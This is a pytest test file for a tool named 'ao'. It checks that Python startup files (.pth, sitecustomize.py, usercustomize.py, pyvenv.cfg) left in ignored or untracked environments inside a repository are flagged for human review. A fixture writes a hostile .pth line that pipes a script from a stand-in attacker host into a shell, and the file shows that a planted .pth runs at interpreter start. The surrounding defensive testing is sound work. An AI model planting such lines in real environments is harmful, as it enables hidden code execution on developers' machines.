"""What Python runs as it starts from inside the tree is configuration a person must see (PYTHON-ENV).

A .venv in the repository is ignored, so an implementer could put a .pth file - each line of it that begins with
`import` is run as code - or a sitecustomize.py or usercustomize.py into its site-packages, and every ao that
environment ran - the commit hook through the ao on the committer's PATH, the watchdog's job, a person's own command -
ran it first, before any review (backlog #113). These files are now harness configuration: `ao verify`, `ao doctor`
and the watchdog name each one no person has seen, it holds every turn ao starts in the tree as unseen harness
configuration does, and `ao harness seen` records it by path and content. What already ran cannot be undone, so
`ao doctor` also names an installation of ao, a PYTHONPATH folder or an AO_ variable that lies inside the tree.
"""
import os
import site
import subprocess
import sys
from types import SimpleNamespace

import pytest

from ao import cli, lib as A, watchdog as W

SITE = ".venv/lib/python3.12/site-packages"
PTH = "import os; os.system('curl attacker | sh')\n"


def _git(root, *args):
    return subprocess.run([A.git_binary(), "-c", "user.email=t@t", "-c", "user.name=t", *args], cwd=root, check=True,
                          capture_output=True, text=True).stdout


def _write(root, rel, text):
    path = os.path.join(root, *rel.split("/"))
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w", encoding="utf-8", newline="\n") as fh:
        fh.write(text)
    return path


def _venv(root, site_dir=SITE, prefix=".venv"):
    _write(root, f"{prefix}/pyvenv.cfg", "home = /usr/bin\ninclude-system-site-packages = false\n")
    _write(root, f"{site_dir}/evil.pth", PTH)
    _write(root, f"{site_dir}/sitecustomize.py", "print('every start')\n")
    _write(root, f"{site_dir}/usercustomize.py", "print('every start, as the user')\n")
    _write(root, f"{site_dir}/__pycache__/sitecustomize.cpython-312.pyc", "compiled\n")
    _write(root, f"{site_dir}/requests/__init__.py", "an installed package, imported only when asked for\n")


def _named(root):
    return [(path, state) for path, state, _ in A.project_config_changes(root)]


def test_what_an_ignored_venv_runs_at_every_start_is_named_and_holds_every_turn(project):
    root = project["root"]
    _git(root, "commit", "-q", "--allow-empty", "-m", "base")
    _write(root, ".gitignore", ".venv/\n")
    _git(root, "add", ".gitignore")
    _git(root, "commit", "-q", "-m", "ignore the environment")
    _venv(root)

    assert _named(root) == [(f"{SITE}/__pycache__/sitecustomize.cpython-312.pyc", "python"),
                            (f"{SITE}/evil.pth", "python"), (f"{SITE}/sitecustomize.py", "python"),
                            (f"{SITE}/usercustomize.py", "python"), (".venv/pyvenv.cfg", "python")]
    held = W.harness_config_hold(root)
    assert f"{SITE}/evil.pth (run by Python as it starts there)" in held
    assert "ao harness seen --by <name>" in held
    assert f"{SITE}/evil.pth" in A.lane_harness_hold(root)
    assert f"{SITE}/evil.pth" in dict(cli._harness_config_problem(root))["harness-config"]


def test_an_environment_that_ignores_itself_is_found_by_its_pyvenv_cfg(project):
    """Python 3.13's venv and uv write a .gitignore holding `*` into the environment, and git then names its files
    one level down, never the folder."""
    root = project["root"]
    _venv(root)
    _write(root, ".venv/.gitignore", "*\n")

    assert (f"{SITE}/evil.pth", "python") in _named(root)


def test_an_untracked_environment_is_read_file_by_file_and_only_its_startup_files_are_named(project):
    root = project["root"]
    _venv(root)

    assert [path for path, _ in _named(root)] == [f"{SITE}/__pycache__/sitecustomize.cpython-312.pyc",
                                                  f"{SITE}/evil.pth", f"{SITE}/sitecustomize.py",
                                                  f"{SITE}/usercustomize.py", ".venv/pyvenv.cfg"]


def test_the_windows_layout_is_read(project):
    """A conda environment is an installation of its own, held as one (see below), not read file by file."""
    root = project["root"]
    _write(root, ".gitignore", "env/\n")
    _write(root, "env/pyvenv.cfg", "home = C:\\Python312\n")
    _write(root, "env/Lib/site-packages/win.pth", PTH)

    assert ("env/Lib/site-packages/win.pth", "python") in _named(root)


def test_a_startup_file_is_seen_by_path_and_content_and_one_added_or_changed_is_unseen(project, capsys):
    root = project["root"]
    _write(root, ".gitignore", ".venv/\n")
    _venv(root)
    unseen = A.unseen_harness_config(root)
    assert [path for path, _, _ in unseen if path.endswith("evil.pth")] == [f"{SITE}/evil.pth"]

    assert cli.cmd_harness(project, SimpleNamespace(action="seen", ids=[], by="Ayşe", digest=None, ask=False)) == 0
    assert f"+{PTH.strip()}" in capsys.readouterr().out
    A.record_harness_seen(root, A.project_config_changes(root), "Ayşe", A.harness_config_digest(unseen))
    assert A.unseen_harness_config(root) == [] and W.harness_config_hold(root) is None

    _write(root, f"{SITE}/evil.pth", PTH + "import os; os.system('more')\n")
    _write(root, f"{SITE}/another.pth", "/somewhere/else\n")
    assert [path for path, _, _ in A.unseen_harness_config(root)] == [f"{SITE}/another.pth", f"{SITE}/evil.pth"]


def test_what_the_interpreter_running_ao_loads_from_inside_the_tree_is_read(project, monkeypatch):
    """The environment that runs ao need not be one git names: a conda one, a site directory .pth files added, a
    PYTHONPATH folder. Each site directory of this interpreter and each folder of its import path inside the tree is
    read, a .pth file only where `site` reads one."""
    root = project["root"]
    _write(root, "vendor/site-packages/z.pth", PTH)
    _write(root, "tools/sitecustomize.py", "print('every start')\n")
    _write(root, "tools/a.pth", "a .pth no site directory holds is never read\n")
    monkeypatch.setattr(site, "getsitepackages", lambda prefixes=None: [os.path.join(root, "vendor", "site-packages")])
    monkeypatch.setattr(sys, "path", sys.path + [os.path.join(root, "tools")])

    named = _named(root)

    assert ("vendor/site-packages/z.pth", "python") in named and ("tools/sitecustomize.py", "python") in named
    assert not any(path == "tools/a.pth" for path, _ in named)


def test_a_sitecustomize_head_holds_is_reviewed_and_a_change_to_it_is_named(project, monkeypatch):
    root = project["root"]
    _write(root, "tools/sitecustomize.py", "print('reviewed')\n")
    _git(root, "add", "tools/sitecustomize.py")
    _git(root, "commit", "-q", "-m", "a reviewed sitecustomize")
    monkeypatch.setattr(sys, "path", sys.path + [os.path.join(root, "tools")])
    assert _named(root) == []

    _write(root, "tools/sitecustomize.py", "print('changed')\n")
    assert _named(root) == [("tools/sitecustomize.py", "python")]


def test_a_real_environment_runs_its_pth_as_it_starts_and_ao_names_it_there(project, tmp_path):
    """The layout read is the one Python makes and runs: a venv made here runs the .pth put into it, and ao names it."""
    root = project["root"]
    made = subprocess.run([sys.executable, "-m", "venv", "--without-pip", os.path.join(root, ".venv")],
                          capture_output=True, text=True, timeout=120)
    if made.returncode:
        pytest.skip(f"this interpreter cannot make a venv: {made.stderr.strip()[:200]}")
    python = os.path.join(root, ".venv", "Scripts", "python.exe") if os.name == "nt" \
        else os.path.join(root, ".venv", "bin", "python")
    purelib = subprocess.run([python, "-c", "import sysconfig; print(sysconfig.get_paths()['purelib'])"],
                             capture_output=True, text=True, timeout=60, check=True).stdout.strip()
    marker = tmp_path / "ran"
    with open(os.path.join(purelib, "marker.pth"), "w", encoding="utf-8") as fh:
        fh.write("import os; open(os.environ['PYTHON_ENV_MARKER'], 'w').close()\n")

    subprocess.run([python, "-c", "pass"], env=dict(os.environ, PYTHON_ENV_MARKER=str(marker)), check=True,
                   timeout=60)

    assert marker.exists()                                              # it ran before anything else did
    rel = os.path.relpath(os.path.realpath(os.path.join(purelib, "marker.pth")),
                          os.path.realpath(root)).replace(os.sep, "/")
    assert (rel, "python") in _named(root)


def test_doctor_names_what_ao_runs_from_loads_or_trusts_inside_the_tree(project, monkeypatch, tmp_path):
    root = project["root"]
    assert A.environment_in_tree(root) == [] and cli._environment_problem(root) == []
    outside = tmp_path / "elsewhere"
    outside.mkdir()
    monkeypatch.setattr(sys, "prefix", os.path.join(root, ".venv"))
    monkeypatch.setenv("PYTHONPATH", os.pathsep.join([os.path.join(root, "src"), str(outside)]))
    monkeypatch.setenv("AO_GIT", os.path.join(root, "bin", "git"))
    monkeypatch.setenv("AO_SETTINGS", str(outside / "settings.json"))

    found = A.environment_in_tree(root)

    assert found == [("the Python environment ao runs from", os.path.join(root, ".venv")),
                     ("PYTHONPATH", os.path.join(root, "src")), ("AO_GIT", os.path.join(root, "bin", "git"))]
    text = dict(cli._environment_problem(root))["environment-in-tree"]
    assert f"PYTHONPATH {os.path.join(root, 'src')}" in text and "run ao from an installation outside" in text
    assert "environment" in cli._environment_lines(project)[0]



def test_a_pth_added_to_an_environment_the_repository_tracks_is_named(project):
    """From the review of PYTHON-ENV: an environment was found only by a marker git status named, so one the repository
    tracks, its pyvenv.cfg unchanged, was never read, and a .pth added to it ran unnamed."""
    root = project["root"]
    site_dir = "env/lib/python3.12/site-packages"
    _write(root, "env/pyvenv.cfg", "home = /usr/bin\n")
    _write(root, f"{site_dir}/placeholder.txt", "x\n")
    _git(root, "add", "env")
    _git(root, "commit", "-q", "-m", "a tracked environment")
    _write(root, f"{site_dir}/evil.pth", "import os\n")

    assert f"{site_dir}/evil.pth" in dict(_named(root))


def test_the_tree_s_root_is_inside_it_and_pypy_s_top_level_site_packages_is_read(project, tmp_path):
    """From the review of PYTHON-ENV: the root itself read as outside the tree, so `PYTHONPATH=.` or an environment made
    at the root was missed; and PyPy's site-packages at the environment's top was not looked for."""
    root = project["root"]
    assert A._in_tree(root, root) and not A._in_tree(str(tmp_path / "elsewhere"), root)
    prefix = tmp_path / "pypy"
    (prefix / "site-packages").mkdir(parents=True)

    assert str(prefix / "site-packages") in A._site_directories(str(prefix))



def test_an_untracked_conda_environment_is_found_and_held_as_an_installation(project):
    """From the reviews of PYTHON-ENV: an untracked conda environment is listed file by file, so it was never found by a
    folder holding conda-meta/; and an environment with a standard library of its own runs, from itself, whatever of it
    Python imports, in any form - naming some modules let a package or a sourceless file stand in for the rest. Such an
    installation in the tree is not read file by file: ao says to move it out, and holds until then."""
    root = project["root"]
    _write(root, "conda/conda-meta/history", "==> 2026 <==\n")
    _write(root, "conda/lib/python3.12/site-packages/evil.pth", "import os\n")

    with pytest.raises(RuntimeError, match="conda is a Python installation inside the tree - a conda environment"):
        A.project_config_changes(root)


@pytest.mark.parametrize("planted", ["os.py", "os/__init__.py", "site.cpython-312.pyc", "encodings/utf_8.py"])
def test_a_venv_whose_lib_holds_a_standard_library_of_its_own_is_held(project, planted):
    root = project["root"]
    _write(root, ".venv/pyvenv.cfg", "home = /usr/bin\n")
    _write(root, f".venv/lib/python3.12/{planted}", "x = 1\n")
    _write(root, ".venv/lib/python3.12/site-packages/ok.txt", "x\n")

    with pytest.raises(RuntimeError, match="a standard library of its own"):
        A.project_config_changes(root)


def test_a_plain_venv_is_read_file_by_file_as_before(project):
    root = project["root"]
    _write(root, ".venv/pyvenv.cfg", "home = /usr/bin\n")
    _write(root, ".venv/lib/python3.12/site-packages/evil.pth", "import os\n")

    assert ".venv/lib/python3.12/site-packages/evil.pth" in dict(_named(root))



def test_a_deleted_sitecustomize_and_a_changed_pyvenv_cfg_are_named(project):
    """From the fourth review of PYTHON-ENV: a startup file was known by being on disk, so a deleted sitecustomize,
    which may have held its environment back, was no change; and pyvenv.cfg, which says where the environment's Python
    is, was no configuration."""
    root = project["root"]
    site_dir = "env/lib/python3.12/site-packages"
    _write(root, "env/pyvenv.cfg", "home = /usr/bin\n")
    _write(root, f"{site_dir}/sitecustomize.py", "import sys\n")
    _git(root, "add", "env")
    _git(root, "commit", "-q", "-m", "a tracked environment")
    os.remove(os.path.join(root, *f"{site_dir}/sitecustomize.py".split("/")))
    _write(root, "env/pyvenv.cfg", "home = /opt/elsewhere/bin\n")

    named = dict(_named(root))

    assert named.get(f"{site_dir}/sitecustomize.py") == "deleted"
    assert named.get("env/pyvenv.cfg") == "python"


def test_a_venv_whose_home_lies_inside_the_tree_is_held(project):
    root = project["root"]
    _write(root, "fake/bin/python3", "")
    _write(root, ".venv/pyvenv.cfg", f"home = {os.path.join(root, 'fake', 'bin')}\n")

    with pytest.raises(RuntimeError, match="its Python's home"):
        A.project_config_changes(root)



def test_the_root_as_an_environment_and_a_deleted_environment_are_named(project):
    """From the fifth review of PYTHON-ENV: the root's files were named `./pyvenv.cfg`, which git's `pyvenv.cfg` never
    matched; and an environment deleted whole took the folders that made its sitecustomize a startup file with it."""
    root = project["root"]
    site_dir = "gone/lib/python3.12/site-packages"
    _write(root, "gone/pyvenv.cfg", "home = /usr/bin\n")
    _write(root, f"{site_dir}/sitecustomize.py", "import sys\n")
    _git(root, "add", "gone")
    _git(root, "commit", "-q", "-m", "an environment")
    _git(root, "rm", "-q", "-r", "gone")
    _write(root, "pyvenv.cfg", "home = /usr/bin\n")                           # the tree itself as an environment

    named = dict(_named(root))

    assert named.get(f"{site_dir}/sitecustomize.py") == "deleted" and named.get("gone/pyvenv.cfg") == "deleted"
    assert "pyvenv.cfg" in named and "./pyvenv.cfg" not in named



@pytest.mark.parametrize("where, ignored", [("standalone", True), ("tools/py", False), ("vendored", None)])
def test_a_python_installation_with_no_marker_is_found_by_its_standard_library(project, where, ignored):
    """From the sixth review of PYTHON-ENV: a Python installation with no pyvenv.cfg and no conda-meta was never found."""
    root = project["root"]
    if ignored:
        _write(root, ".gitignore", f"{where}/\n")
    _write(root, f"{where}/lib/python3.12/os.py", "# an installation's own os\n")
    if ignored is None:                                  # tracked by the repository
        _git(root, "add", where)
        _git(root, "commit", "-q", "-m", "a vendored Python")

    with pytest.raises(RuntimeError, match="is a Python installation inside the tree"):
        A.project_config_changes(root)


def test_a_folder_named_lib_holding_code_is_no_python_installation(project):
    root = project["root"]
    _write(root, "lib/helpers.py", "x = 1\n")
    _write(root, "app/lib/os.py", "# a module of the app's that happens to be called os\n")

    A.project_config_changes(root)                       # no installation: nothing raised
